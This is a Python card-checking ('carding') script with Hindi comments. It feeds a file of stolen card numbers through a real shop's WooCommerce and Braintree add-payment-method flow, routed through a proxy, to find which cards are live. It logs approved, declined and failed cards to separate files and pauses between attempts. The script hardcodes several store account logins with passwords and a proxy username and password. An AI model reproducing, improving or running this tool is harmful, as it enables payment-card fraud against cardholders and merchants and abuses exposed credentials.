import base64
import random
import time
import re
import requests
import logging
import uuid

# Logging ko kam kar diya hai taki console saaf dikhe
logging.basicConfig(level=logging.ERROR)

# --- Helper Functions ---
def get_between(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except (IndexError, AttributeError):
        return None

def format_response_message(result_text):
    """Gateway se mile response ko saaf karta hai."""
    approved_messages = [
        "Payment method successfully added.",
        "Nice! New payment method added",
        "Invalid postal code or street address.",
        "avs: Gateway Rejected: avs",
        "81724: Duplicate card exists in the vault."
    ]
    if any(msg in result_text for msg in approved_messages):
        return "Approved ✅"
    else:
        clean_result = re.sub('<[^<]+?>', '', result_text).strip()
        return f"Declined ❌ - {clean_result}"

# --- Main Processing Function ---
def process_card_braintree(fullz, account, proxy_dict):
    """
    Ek card ko diye gaye account aur default proxy se process karta hai.
    """
    try:
        cc, mes, ano, cvv = fullz.split("|")
        username, password = account

        if len(mes) < 2: mes = "0" + mes
        if "20" not in ano: ano = f'20{ano}'

        session = requests.Session()
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        headers = {'User-Agent': user_agent}

        # Step 1: Login
        login_url = 'https://iditarod.com/my-account/add-payment-method/'
        response = session.get(login_url, headers=headers, proxies=proxy_dict, timeout=25)
        login_nonce = get_between(response.text, 'name="woocommerce-login-nonce" value="', '"')
        if not login_nonce:
            return {"status": "Error", "response": "Login Nonce Not Found (Proxy Issue?)"}

        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://iditarod.com',
            'Referer': login_url,
        })
        login_data = {'username': username, 'password': password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
        session.post(login_url, headers=headers, data=login_data, proxies=proxy_dict, timeout=25)

        # Step 2: Get Payment Nonces
        response = session.get(login_url, headers=headers, proxies=proxy_dict, timeout=25)
        pnonce = get_between(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token_nonce = get_between(response.text, '"client_token_nonce":"', '"')
        if not pnonce or not client_token_nonce:
            return {"status": "Error", "response": "Payment Nonces Not Found"}

        # Step 3: Get Braintree Auth Token
        ajax_url = 'https://iditarod.com/wp-admin/admin-ajax.php'
        ajax_headers = headers.copy()
        ajax_headers['X-Requested-With'] = 'XMLHttpRequest'
        ajax_data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
        response = session.post(ajax_url, headers=ajax_headers, data=ajax_data, proxies=proxy_dict, timeout=25)
        
        if 'data' not in response.json():
            return {"status": "Error", "response": "Client Token Data Not Found"}
        
        decoded_token = base64.b64decode(response.json()['data']).decode('utf-8')
        auth_fingerprint = get_between(decoded_token, 'authorizationFingerprint":"', '"')
        if not auth_fingerprint:
            return {"status": "Error", "response": "Authorization Fingerprint Not Found"}

        # Step 4: Tokenize Card
        graphql_url = 'https://payments.braintree-api.com/graphql'
        graphql_headers = {'Authorization': f'Bearer {auth_fingerprint}', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json', 'User-Agent': user_agent}
        graphql_data = {'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }', 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}}}}
        response = requests.post(graphql_url, headers=graphql_headers, json=graphql_data, timeout=25)
        
        if 'errors' in response.json():
            return {"status": "Declined", "response": f"Declined ❌ - {response.json()['errors'][0]['message']}"}

        card_token = response.json()['data']['tokenizeCreditCard']['token']
        if not card_token:
            return {"status": "Error", "response": "Card Tokenization Failed"}

        # Step 5: Add Payment Method
        final_data = [('payment_method', 'braintree_credit_card'), ('wc_braintree_credit_card_payment_nonce', card_token), ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', pnonce), ('woocommerce_add_payment_method', '1')]
        response = session.post(login_url, headers=headers, data=final_data, proxies=proxy_dict, timeout=25)

        # Step 6: Parse Final Response
        if "Payment method successfully added" in response.text:
            return {"status": "Approved", "response": "Approved ✅"}
        else:
            error_text = get_between(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>') or "Unknown final error"
            return {"status": "Declined", "response": format_response_message(error_text)}

    except Exception as e:
        return {"status": "Error", "response": f"Error 🚫 - {str(e)}"}

# --- Main Execution Block ---
if __name__ == "__main__":
    # Aapke accounts
    accounts = [
        ("teamdiwas@gmail.com", "@khatrieex"),
        ("khatrieex0011@gmail.com", "@khatrieex"),
        ("khatrieex0015@gmail.com", "@khatrieex")
    ]
    
    # Default Proxy Setup
    default_proxy_str = "63.246.137.36:5665:logqdxdr:776r5yc7ec8n"
    ip, port, user, pwd = default_proxy_str.split(':')
    proxy_url = f'http://{user}:{pwd}@{ip}:{port}'
    proxy_dict = {'http': proxy_url, 'https': proxy_url}

    # Card file ka naam poochna
    try:
        card_file_name = input("Enter Combo File Name (e.g., card.txt): ")
        with open(card_file_name, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        if not cards:
            print("File is empty.")
            exit()
    except FileNotFoundError:
        print(f"Error: File '{card_file_name}' not found.")
        exit()

    total_cards = len(cards)
    processed_count, approved_count, declined_count = 0, 0, 0

    approved_file = open('approved.txt', 'a')
    declined_file = open('declined.txt', 'a')
    errors_file = open('errors.txt', 'a')

    print("-" * 70)
    print(f"Cards Loaded: {total_cards} | Proxy: {ip}:{port}")
    print("Processing Started... Made By @diwazz )")
    print("-" * 70)

    try:
        for card in cards:
            # Random account chunna
            current_account = random.choice(accounts)
            
            result = process_card_braintree(card, current_account, proxy_dict)
            processed_count += 1
            
            status = result.get('status', 'Error')
            response_msg = result.get('response', 'No response')

            if status == "Approved":
                approved_count += 1
                approved_file.write(f"{card} -> {response_msg}\n")
                approved_file.flush()
            elif status == "Declined":
                declined_count += 1
                declined_file.write(f"{card} -> {response_msg}\n")
                declined_file.flush()
            else:
                errors_file.write(f"{card} -> {response_msg}\n")
                errors_file.flush()

            # Live counter display (Email hata diya gaya hai aur Response add kiya gaya hai)
            print(f"\r[{processed_count}/{total_cards}] CARD: {card} | MSG: {response_msg} | ✅: {approved_count} | ❌: {declined_count}", end="", flush=True)
            
            # 20 second ka wait
            time.sleep(20)

    except KeyboardInterrupt:
        print("\n\nProcessing stopped by user.")
    finally:
        approved_file.close()
        declined_file.close()
        errors_file.close()
        print("\n" + "-" * 70)
        print("Processing Finished. Results saved.")
        print("-" * 70)
